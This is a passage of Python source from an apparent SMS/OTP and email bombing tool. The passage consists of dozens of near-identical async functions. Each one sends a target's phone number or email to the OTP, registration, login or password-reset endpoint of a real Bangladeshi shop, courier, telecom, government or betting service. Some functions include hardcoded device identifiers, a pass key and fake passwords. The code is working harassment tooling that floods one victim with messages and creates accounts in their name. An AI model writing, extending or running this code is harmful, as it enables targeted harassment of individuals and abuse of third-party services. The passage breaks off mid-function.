        api_name = "Api70 - Garibook"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.garibookadmin.com/api/v3/user/login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API70 - Garibook", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API70 - Garibook", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api71___fabrilife_signup(self):
        api_name = "Api71 - Fabrilife Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://fabrilifess.com/api/wp-json/wc/v2/user/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API71 - Fabrilife Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API71 - Fabrilife Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api72___fabrilife_otp(self):
        api_name = "Api72 - Fabrilife Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://fabrilifess.com/api/wp-json/wc/v2/user/phone-login/{target}"
        try:
            async with self.session.post(url, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API72 - Fabrilife OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API72 - Fabrilife OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api73___btcl_bdia(self):
        api_name = "Api73 - Btcl Bdia"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)[1:] if self.target.startswith('0') else self.target
        url = f"https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API73 - BTCL BDIA", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API73 - BTCL BDIA", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api74___btcl_phonebill_register(self):
        api_name = "Api74 - Btcl Phonebill Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API74 - BTCL PhoneBill Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API74 - BTCL PhoneBill Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api75___btcl_phonebill_login(self):
        api_name = "Api75 - Btcl Phonebill Login"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API75 - BTCL PhoneBill Login", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API75 - BTCL PhoneBill Login", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api76___redx_merchant_otp(self):
        api_name = "Api76 - Redx Merchant Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API76 - RedX Merchant OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API76 - RedX Merchant OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api77___khaasfood_digits_otp(self):
        api_name = "Api77 - Khaasfood Digits Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.khaasfood.com/wp-admin/admin-ajax.php".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API77 - KhaasFood Digits OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API77 - KhaasFood Digits OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api78___robi_web_otp(self):
        api_name = "Api78 - Robi Web Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.robi.com.bd/en/v1".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API78 - Robi Web OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API78 - Robi Web OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api79___sindabad_offers_otp_v2(self):
        target = '+88' + self.target
        url = f"https://offers.sindabad.com/api/mobile-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API79 - Sindabad Offers OTP v2", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API79 - Sindabad Offers OTP v2", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api80___gp_fi_fwa_otp(self):
        api_name = "Api80 - Gp Fi Fwa Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API80 - GP FI FWA OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API80 - GP FI FWA OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api81___kabbik_otp_v2(self):
        target = '88' + self.target
        url = f"https://api.kabbik.com/v1/auth/otpnew2".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"msisdn":"88{phone}","currentTimeLong":" + System.currentTimeMillis() + ","passKey":"GmIRDFRrRyoeLRYq"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API81 - Kabbik OTP v2", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API81 - Kabbik OTP v2", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api82___sundora_otp_backend(self):
        api_name = "Api82 - Sundora Otp Backend"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://otp-backend.fly.dev/api/otp/send".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API82 - Sundora OTP Backend", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API82 - Sundora OTP Backend", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api83___walton_plaza_otp_v2(self):
        api_name = "Api83 - Walton Plaza Otp V2"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://waltonplaza.com.bd/api/auth/otp/create".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"auth":{"countryCode":"880","deviceUuid":"device-{phone}","phone":"{phone}","type":"LOGIN"},"captchaToken":"no recapcha"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API83 - Walton Plaza OTP v2", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API83 - Walton Plaza OTP v2", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api84___btcl_mybtcl_register(self):
        api_name = "Api84 - Btcl Mybtcl Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API84 - BTCL MyBTCL Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API84 - BTCL MyBTCL Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api85___btcl_mybtcl_bcare(self):
        api_name = "Api85 - Btcl Mybtcl Bcare"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://mybtcl.btcl.gov.bd/api/bcare/anonym/sendOTP.json".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API85 - BTCL MyBTCL Bcare", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API85 - BTCL MyBTCL Bcare", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api86___ecourier_individual_otp(self):
        api_name = "Api86 - Ecourier Individual Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}"
        try:
            async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API86 - eCourier Individual OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API86 - eCourier Individual OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api87___carrybee_merchant_register(self):
        api_name = "Api87 - Carrybee Merchant Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)[1:] if self.target.startswith('0') else self.target
        url = f"https://api-merchant.carrybee.com/api/v2/merchant/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API87 - Carrybee Merchant Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API87 - Carrybee Merchant Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api88___carrybee_forget_password(self):
        api_name = "Api88 - Carrybee Forget Password"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)[1:] if self.target.startswith('0') else self.target
        url = f"https://api-merchant.carrybee.com/api/v2/forget-password".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API88 - Carrybee Forget Password", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API88 - Carrybee Forget Password", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api89___cartup_signup(self):
        api_name = "Api89 - Cartup Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.cartup.com/customer/api/v1/customer/auth/new-onboard/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API89 - CartUp Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API89 - CartUp Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api90___easyfashion_digits_otp(self):
        api_name = "Api90 - Easyfashion Digits Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://easyfashion.com.bd/wp-admin/admin-ajax.php".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API90 - EasyFashion Digits OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API90 - EasyFashion Digits OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api91___sara_lifestyle_otp(self):
        api_name = "Api91 - Sara Lifestyle Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://prod.saralifestyle.com/api/Master/SendTokenV1".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API91 - Sara Lifestyle OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API91 - Sara Lifestyle OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api92___electronics_bangladesh_otp(self):
        api_name = "Api92 - Electronics Bangladesh Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://storeapi.electronicsbangladesh.com/api/auth/send-otp-for-login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API92 - Electronics Bangladesh OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API92 - Electronics Bangladesh OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api93___esquire_electronics_check_user(self):
        api_name = "Api93 - Esquire Electronics Check User"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.ecommerce.esquireelectronicsltd.com/api/user/check-user-for-registration".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API93 - Esquire Electronics Check User", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API93 - Esquire Electronics Check User", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api94___sheba_electronics_otp(self):
        api_name = "Api94 - Sheba Electronics Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://admin.shebaelectronics.co/api/customer/register/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API94 - Sheba Electronics OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API94 - Sheba Electronics OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api95___sumash_tech_otp(self):
        api_name = "Api95 - Sumash Tech Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.sumashtech.com/api/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API95 - Sumash Tech OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API95 - Sumash Tech OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api96___volthbd_registration(self):
        api_name = "Api96 - Volthbd Registration"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.volthbd.com/api/v1/auth/registrations".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API96 - VolthBD Registration", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API96 - VolthBD Registration", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api97___rangs_shop_otp(self):
        api_name = "Api97 - Rangs Shop Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)[1:] if self.target.startswith('0') else self.target
        url = f"https://ecom.rangs.com.bd/send-otp-code".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API97 - Rangs Shop OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API97 - Rangs Shop OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api98___eyecon_app_transport(self):
        api_name = "Api98 - Eyecon App Transport"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)[1:] if self.target.startswith('0') else self.target
        url = f"https://api.eyecon-app.com/app/cli_auth/gettransport?cv=vc_510_vn_4.0.510_a&cli=88{target}&reg_id=flycT4-STvehHQq5O2pTcE%3AAPA91bEpVMgtLmd4vxYZn2jSUH7_Stvvp_4Ui19ibI15gcjVJ7G9Vg5fxAW_MWy6bFtw_I67lPVJzJejjACOEBYVW_ww2_RghRxuHqGZxetBbUzt-8uB7HfKx4MM25P7WbZhn0QzGQu6&installer_name=manually+or+unknown+source&n_sims=2&is_sms_sending_available=true&is_whatsapp_installed=true&device_id=473e9a981fddd587&time_zone=Asia%2FDhaka&device_manu=Xiaomi&device_model=Redmi+Note+7+Pro"
        try:
            async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API98 - Eyecon App Transport", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API98 - Eyecon App Transport", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api99___vision_emporium_register(self):
        api_name = "Api99 - Vision Emporium Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)[1:] if self.target.startswith('0') else self.target
        url = f"https://visionemporiumbd.com/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API99 - Vision Emporium Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API99 - Vision Emporium Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api100___basa18_sms(self):
        api_name = "Api100 - Basa18 Sms"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.basa18.com/wps/v2/verification/sms/send".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"mobileNum":"{phone}","operationType":5,"countryDialingCode":null}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API100 - BASA18 SMS", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API100 - BASA18 SMS", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api101___pkluck_register(self):
        api_name = "Api101 - Pkluck Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.pkluck2.com/wps/verification/sms/register".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API101 - PKLuck Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API101 - PKLuck Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api102___pkluck_nologin_otp(self):
        api_name = "Api102 - Pkluck Nologin Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.pkluck2.com/wps/verification/sms/noLogin".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API102 - PKLuck NoLogin OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API102 - PKLuck NoLogin OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api103___8mbets_register(self):
        api_name = "Api103 - 8Mbets Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.8mbets.net/api/register/verify".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"username":"user{phone}","email":","mobileno":"{phone}","new_password":"Password@123","confirm_new_password":"Password@123","currency":"BDT","language":"bn","langCountry":"bn-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API103 - 8MBets Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API103 - 8MBets Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api104___8mbets_new_mobile_request(self):
        api_name = "Api104 - 8Mbets New Mobile Request"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.8mbets.net/api/user/new-mobile-request".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"type":"verify-mobile","username":"user{phone}","language":"bn","langCountry":"bn-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API104 - 8MBets New Mobile Request", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API104 - 8MBets New Mobile Request", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api105___8mbets_forget_tac(self):
        api_name = "Api105 - 8Mbets Forget Tac"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.8mbets.net/api/user/request-forget-tac".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"type":"forget","method":"mobileno","value":"880{phone}","key":"mobileno","language":"bn","langCountry":"bn-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API105 - 8MBets Forget TAC", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API105 - 8MBets Forget TAC", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api106___jayabaji_register(self):
        api_name = "Api106 - Jayabaji Register"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.jayabaji3.com/api/register/confirm".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"mobileno":"{phone}","username":"user{phone}","firstname":","new_password":"Password@123","confirm_new_password":"Password@123","country_code":"880","country":"BD","currency":"BDT","ref":","language":"en","langCountry":"en-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API106 - Jayabaji Register", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API106 - Jayabaji Register", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api107___jayabaji_new_mobile_request(self):
        api_name = "Api107 - Jayabaji New Mobile Request"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.jayabaji3.com/api/user/new-mobile-request".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"type":"verify-mobile","username":"user{phone}","language":"en","langCountry":"en-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API107 - Jayabaji New Mobile Request", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API107 - Jayabaji New Mobile Request", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api108___jayabaji_login_tac(self):
        api_name = "Api108 - Jayabaji Login Tac"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.jayabaji3.com/api/user/request-login-tac".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"uname":"880{phone}","sendType":"mobile","country_code":"880","currency":"BDT","mobileno":"{phone}","language":"en","langCountry":"en-bd"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API108 - Jayabaji Login TAC", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API108 - Jayabaji Login TAC", False, "Error", fmt=current_api_fmt.get())
            return False

    # Email APIs

    @smart_api
    async def api_email1___bikroy_account(self):
        api_name = "Email1 - Bikroy Account"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://bikroy.com/data/account".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"account":{"profile":{"name":"{randomName}","opt_out":false},"login":{"email":"{phone}","password":"Sojib12345"}}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL1 - Bikroy Account", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL1 - Bikroy Account", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email2___bikroy_password_reset(self):
        api_name = "Email2 - Bikroy Password Reset"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://bikroy.com/data/password_resets".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"email":"{phone}"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL2 - Bikroy Password Reset", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL2 - Bikroy Password Reset", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_email3___busbud_signup(self):
        api_name = "Email3 - Busbud Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.busbud.com/auth/email-signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"first_name":"Md","last_name":"SOJIB","email":"{phone}","password":"Sojib12345","confirmed_password":"Sojib12345","email_opt_in":false,"locale":"en"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
